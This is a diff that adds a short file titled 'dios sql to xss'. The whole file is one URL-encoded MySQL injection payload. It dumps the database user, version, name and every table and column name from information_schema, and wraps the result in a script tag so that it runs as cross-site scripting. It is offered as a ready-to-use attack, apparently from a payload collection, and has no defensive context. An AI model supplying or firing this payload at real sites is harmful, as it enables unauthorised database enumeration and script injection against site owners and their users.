@@ -1,0 +1,2 @@
+dios sql to xss
+concat(%27<script>prompt("%27,%27Injected%20By%20Benny%27,%27:||:%27,user(),%27:||:%27,version(),%27:||:%27,database(),%27:||:%27,(select(@x)from(select(@x:=0x00),(select(0)From(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=coNcat(@x,%27<li>%27,table_name,%27::%27,column_name))))x),%27",document.domain)</script>%27)
